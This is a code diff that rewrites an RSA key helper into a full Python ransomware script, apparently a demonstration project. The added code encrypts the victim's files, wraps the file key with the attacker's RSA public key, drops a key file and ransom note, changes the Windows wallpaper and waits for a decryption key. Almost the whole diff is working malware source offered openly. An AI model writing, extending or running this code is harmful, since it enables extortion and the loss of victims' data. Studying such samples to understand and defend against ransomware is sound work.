@@ -1,116 +1,188 @@
+#!/usr/bin/python3
+from cryptography.fernet import Fernet # Encrypt/Decrypt files on target
+import os # Get System root
+import webbrowser # Load User's Browser
+import ctypes # Call DLLs or Shared libaraies
+import subprocess # to open up notepad 
+import threading # For Multi threading
+import platform # Checking Platform
+import urllib.request
+import requests
+from time import sleep
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES,PKCS1_OAEP # PKCS#1 OAEP is an asymmetric cipher based on RSA and the OAEP padding
 
-#Geberate RSA Key
-def generate_key():
-    global key
-    global key_pair
+def getOS():
 
-    #generate RSA key pair
-    print("[+] Generating RSA Key Pair")
-    key = RSA.generate(2048) #Create a new RSA key pair
-    print(f"[+] Generated RSA Key :{key}")
-    key_pair={}
-    #print(key)
-    key_pair['private']=key.exportKey() #export Private Key
-    key_pair['public']=key.publickey().exportKey() #export Public Key
-    print(f"[+] Public key : \n{key_pair['public'].decode('UTF-8')}")
-    print(f"\n[+] Private key : \n{key_pair['private'].decode('UTF-8')}")
-   
-    print("\n[+] Writing Public Key")
-    f = open("public.pem", "wb")
-    f.write(key_pair['public'])
-    f.close()
-    print("[+] Wrote Public Key In public.pem")
+	#Get OS Information
+	victim_os=platform.system()
+	print(f"[+] Victim Is Running A {victim_os} Environment")
+	if victim_os=='Windows':
+		return 0
+	elif victim_os=='Linux':
+		return 1
+	else :
+		return -1
 
-    print("\n[+] Writing Private Key")
-    f = open(".private.pem", "wb") # Hidden file 
-    f.write(key_pair['private'])
-    f.close()
-    print("[+] Wrote Private Key In .private.pem")
-    print('-----------------------------------------------------------')
+class Ransomware:
 
-#Encrypt Fernet Key
-def encrypt_fernet_key():
-	global key_pair
+	file_exts=['txt','mp4','pdf','png'] # Types of files to encrypt
 
-	print("[+] Encrypting Fernet Key With RSA Public Key\n")
+	def __init__(self):
 
-	public_key=RSA.importKey(open('public.pem').read())
-	#public_key=RSA.importKey(key_pair['public']) #Import an RSA key (public), encoded in standard form
-	#print(public_key)
+		#Initialize Variables
+		self.os_int=getOS()
+		self.key=None
+		self.crypter=None
+		self.public_key=None
+		self.sysRoot = os.path.expanduser('~')  #H ome Directory Of Current User
+		self.localRoot = os.path.dirname(os.path.abspath(__file__)) # Path Of Directory Where Program is Placed
+		self.PublicIP = requests.get('https://api.ipify.org').text # Check For Gov/Military IPs
+		print(f"[+] System Root Found At : {self.sysRoot}")
+		print(f"[+] Local Root Found At : {self.localRoot}")
+		print(f"[+] Public IP Of Victim : {self.PublicIP}")
+
+	def generate_key(self):
+
+		#Generate Fernet Key and Create Fernet Object
+		self.key = Fernet.generate_key() # Generate Symmetric Fernet Key To Encrypt/Decrypt Files
+		print(f"[+] Generated Fernet Key As : {self.key}") 
+		self.crypter = Fernet(self.key) # Create Fernet Object
+		print(f"[+] Created Crypter As : {self.crypter}")
+
+	def write_key(self):
+
+		# Write Key To A Local Text File
+		with open('fernet_key.txt','wb') as f:
+			f.write(self.key)
+		print("[+] Wrote Fernet Key Into : fernet_key.txt") 
 	
-	with open('fernet_key.txt','rb') as f :
-		fernet_key=f.read()
-	
-	print(f"[+] Imported fernet key : \n{fernet_key}\n")
-	#Create public encryptor
-	public_encryptor=PKCS1_OAEP.new(public_key) #Return a cipher object PKCS1OAEP_Cipher that can be used to perform PKCS#1 OAEP encryption or decryption
+	def encrypt_fernet_key(self):
 
-	#encrypt fernet key with public key
-	with open('fernet_key.txt','wb') as f:
-		encrypted_fernet_key=public_encryptor.encrypt(fernet_key) #encrypt fernet key with public key
-		f.write(encrypted_fernet_key)
-	print(f"[+] Encrypted Fernet Key : \n{encrypted_fernet_key}")
-	print('-----------------------------------------------------------')
+		# Encrypt Fernet Key With Public Key Of Attacker
+		with open('fernet_key.txt','rb') as fk:
+			fernet_key=fk.read() # Store Contents Of The File As A Backup
+		print("[+] Read Fernet Key From fernet_key.txt")
 
-#Decrypt Fernet Key
-def decrypt_fernet_key():
-	global key_pair
+		with open("fernet_key.txt",'wb') as f:
+			self.public_key=RSA.importKey(open('public.pem').read()) # Import RSA Public Key Of Attacker
+			print(f"[+] Read Public Key From public.pem As {self.public_key}")
+			public_encryptor=PKCS1_OAEP.new(self.public_key) #Return a cipher object PKCS1OAEP_Cipher that can be used to perform PKCS#1 OAEP encryption or decryption
+			enc_fernet_key=public_encryptor.encrypt(fernet_key) #encrypt fernet key with public key
+			f.write(enc_fernet_key) # Write Out The Contents Of The Text File With Encrypted Text
+		print("[+] Encrypted fernet_key.txt With Attacker's Public RSA Key")
+		
+		with open(f"{self.sysRoot}/Desktop/EMAIL_ME.txt",'wb') as fa :
+			fa.write(enc_fernet_key)
+		print(f"[+] Creted EMAIL_ME.txt at {self.sysRoot}/Desktop ")
 
-	print("\n[+] Decrypting Fernet Key With RSA Private Key\n")
+		# Remove Any Data As Good Measure
+		self.key=enc_fernet_key
+		self.crypter=None 
+		print(f"[+] Nullified Key as {self.key}")
+		print(f"[+] Nullified Crypter Object as {self.crypter}")
 
-	private_key=RSA.importKey(open('.private.pem').read())
-	#private_key=RSA.importKey(key_pair['private']) #Import an RSA key (private), encoded in standard form
-	#print(private_key)
-	
-	with open('EMAIL_ME.txt','rb') as f :
-		encrypted_fernet_key=f.read()
-	
-	print(f"[+] Imported Encrypted Fernet Key : \n{encrypted_fernet_key}")
-	#Create public encryptor
-	private_cryptor=PKCS1_OAEP.new(private_key) #Return a cipher object PKCS1OAEP_Cipher that can be used to perform PKCS#1 OAEP encryption or decryption
+	def crypt_file(self,file_path,encrypted=False):
+		
+		#Encrypt/Decrypt Files
+		with open(file_path,'rb') as f : 
+			data=f.read() # read Data from file
+		print(f"[+] Crypter Object In Use : {self.crypter}")
+		# Encrypt Data
+		if not encrypted :
+			_data=self.crypter.encrypt(data)
+			print(f"{file_path} Has Been Encrypted ")
 
-	#encrypt fernet key with public key
-	with open('PUT_ME_ON_DESKTOP.txt','wb') as f:
-		decrypted_fernet_key=private_cryptor.decrypt(encrypted_fernet_key) #encrypt fernet key with public key
-		f.write(decrypted_fernet_key)
-	print(f"\n[+] Decrypted Fernet Key : \n{decrypted_fernet_key}")
-	print('-----------------------------------------------------------')
+		# Decrypt Data
+		else :
 
-def showOptions():
-	print("""[+] What You Wanna Do ?
+			_data=self.crypter.decrypt(data)
+			print(f"{file_path} Has Been Decrypted ")
 
-[1] Generate RSA Key Pair
-[2] Encrypt Fernet Key With RSA Public Key
-[3] Decrypt Fernet Key With RSA Private Key (Generate PUT_ME_ON_DESKTOP.txt)
-[4] Exit
-		""")
+		with open(file_path,'wb') as fp :
+			fp.write(_data)
+
+	def crypt_system(self,encrypted=False):
+
+		#List All Files in the system
+		system= os.walk(self.localRoot,topdown=True) # Can be Changed to sys.sysRoot
+		for root,dir,files in system :
+			for file in files :
+				file_path=os.path.join(root, file)
+				if not file.split('.')[-1] in self.file_exts:
+					continue
+				if not encrypted:
+					self.crypt_file(file_path)
+				else :
+					self.crypt_file(file_path,encrypted=True)
+
+	@staticmethod
+	def whokilleddb_github(): 
+
+		# Open Browser Window
+		url = "https://github.com/whokilleddb" #Change It To A Payment Gateway Maybe ?
+		webbrowser.open(url)
+
+	def change_desktop_background(self):
+
+		# Change Desktop Background
+		if self.os_int == 0 :
+			imageURL = "https://i.imgur.com/lCW3YGu.jpg"
+			path=f"{self.sysRoot}\\Desktop\\Background.jpg"
+			urllib.request.urlretrieve(imageURL,path)
+
+			SPI_SETDESKWALLPAPER = 20 # 0x14 (Desktop Parameter as Set By Win32 API)
+			
+			# The Actual Defination of the C Function as Defined Under SystemParametersInfoW has the following defination
+			# private static extern bool SystemParametersInfoW(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
+			# uiAction  = SPI_SETDESKWALLPAPER = 20
+			# uiParam remains 0 when changing wallpaper 
+			# pvParam  contains file path
+			# fWinIni determines how the change is written to user profile and whether a message should be sent to other windows to notify them of the update.
+			ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER,0,path,0) # For 32 bit Windows, use SystemParametersInfoA
+
+	def ransom_note(self):
+
+		#Prompt Note To Victim
+		note=f"Your Files Have Been Encrypted. Get The Full Code At https://github.com/whokilleddb. Also Send {self.sysRoot}/Desktop/EMAIL_ME.txt to the Attacker"
+
+		with open("fernet_key.txt",'rb') as fp :
+			self.key= fp.read()
+
+		with open('RANSOM_NOTE.txt','w') as f:
+			f.write(note)
+
+		if self.os_int ==0 :
+			ransom = subprocess.Popen(['notepad.exe','RANSOM_NOTE.txt'])
+
+	def put_me_on_desktop(self) :
+		#Check if key exists on Desktop
+		while True :
+			try :
+				with open(f"{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt",'r') as f:
+					self.key= f.read()
+					self.crypter=Fernet(self.key)
+					self.crypt_system(encrypted=True)
+					break
+			except :
+				pass
+			sleep(10)
 
 if __name__ == '__main__':
-	
-	name=R"""
-__        ___           _  ___ _ _          _ ____  ____ ___ 
-\ \      / / |__   ___ | |/ (_) | | ___  __| |  _ \| __ )__ \
- \ \ /\ / /| '_ \ / _ \| ' /| | | |/ _ \/ _` | | | |  _ \ / /
-  \ V  V / | | | | (_) | . \| | | |  __/ (_| | |_| | |_) |_| 
-   \_/\_/  |_| |_|\___/|_|\_\_|_|_|\___|\__,_|____/|____/(_) 
-                                                             
-"""
-	print(name)
-	showOptions()
-	choice = input("[+] Enter You Choice : ")
-	choice = choice.lower()
 
-	while (choice != '4' or choice !=  'exit'):
-		if choice == '1':
-			generate_key()
-		if choice == '2':
-			encrypt_fernet_key()
-		if choice =='3':
-			decrypt_fernet_key()
-		if choice == '4':
-			break
-		showOptions()
-		choice = input("\n[+] Enter You Choice : ")
+	rw = Ransomware()
+	rw.generate_key()
+	rw.crypt_system()
+	rw.write_key()
+	rw.encrypt_fernet_key()
+	rw.change_desktop_background()
+	rw.whokilleddb_github()
+
+	t1 = threading.Thread(target=rw.ransom_note)
+	t2 = threading.Thread(target=rw.put_me_on_desktop)
+
+	t1.start()
+	print(" > Target Encrypted")
+	t2.start()
+	print(" > Attack Completed")
